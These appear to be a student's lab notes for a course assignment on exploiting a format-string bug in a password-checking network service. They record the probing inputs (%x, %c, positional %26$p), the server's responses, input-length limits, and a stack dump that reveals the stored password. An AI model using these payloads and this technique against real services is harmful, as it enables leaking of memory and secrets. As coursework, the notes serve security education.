# Assignment 3 - Problem 1

```bash
ncat 10.21.235.155 1023
```

Example Connection

```
suraj@amd-rathi ~ % ncat 10.21.235.155 1023

Who are you? a

What is the password? bbb
bbb is not the correct password.
```

We see that the password string is passed as a format string

```
suraj@amd-rathi ~ % ncat 10.21.235.155 1023

Who are you? a

What is the password? %x%x
4e332aa025 is not the correct password.
```

alphanumeric and is exactly 30 bytes long

- [48, 57]
- [65, 90]
- [97, 122]

The ascii codes can only be in this range.

``` 
suraj@amd-rathi ~ % ncat 10.21.235.155 1023

Who are you? a

What is the password? aaaaaaaaaabbbbbbbbbbcccccccccc%x%x%x%x
aaaaaaaaaabbbbbbbbbbccccccccccdd15720061f7ffffdf99a8f060 is not the correct password.
```

Questions

1. Do any of the buffers also allow us to overflow them?
2. Do any of the buffers allow us to write '\0'
3. Are only 30 bytes of the password checked/stored/coppied ?

TODO:

1. Automate the ncat process
2. Dump a large part of the stack and just open it in a hexeditor.

Input limited to 98 characters

```
password = "A" * (99)
Connection reset by the server
Your input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

password = "A" * (98)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

password = "A" * (97) + '%c'
Connection reset by the server
Your input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%c

password = "A" * (96) + '%c'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp

password = "A" * (96) + '%x'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA15b39bd0

password =
```

We are overflowing onto the stack I think.

```
password = "A" * (96) + '%x'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA48c03d40

password = "B" * (96) + '%x'
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB1feddb0

password = "C" * (96) + '%x'
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC95f2e40

password = "D" * (96) + '%x'
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD44f84880

password = "D" * (96) + '%c'
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD\xd0

password = "A" * (96) + '%c'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

password = "B" * (96) + '%c'
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xc0

password = "C" * (96) + '%c'
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xd0

password = "D" * (96) + '%c'
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD\xd0

password = "E" * (96) + '%c'
EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xb0

password = "F" * (96) + '%c'
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\x60

password = "G" * (96) + '%c'
GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\x60

password = "H" * (96) + '%c'
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHP

password = "I" * (96) + '%c'
IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII\x40
```

Reach the password on the stack:
Note that %c only prints one of 4 characters

```
password = (pay := bytes([0xAA]) * 2) + b"%c" * (98 // 2  - len(pay))
\xaa\xaa`\xaa\xff`\x00\x1e\xa0twast\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xaa%%%%%%%%%%%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

password = (pay := bytes([0xAA, 0xBB, 0xCC, 0xDD])) + b"_%26$p_%26$x"
\xaa\xbb\xcc\xdd_0xddccbbaa_ddccbbaa
```

How do we find the location of the true password to put it on the stack?

'For the exploit in Figure3 to succeed, we need to know the address of the buffer,
because it is the memory address with which we overwrite the return address.'

What we can do is try to print the stack with minimum smashing to get the contents of the stack. (Assuming it stays the
same between iterations)

Possibly interesting parts of the stack:

```
suraj@amd-rathi ~/Documents/acads/sse/assis/a3/p1 (git)-[master] % ./stack_dump.py
   2:  00000025  \x00\x00\x00%
   5:  00000000  \x00\x00\x00\x00
   6:  0000001e  \x00\x00\x00\x1e
   8:  73696874  siht
   9:  64726f77  drow
  10:  64656b61  deka
  11:  63617473  cats
  12:  74736574  tset
  13:  00000000  \x00\x00\x00\x00
  14:  00000000  \x00\x00\x00\x00
```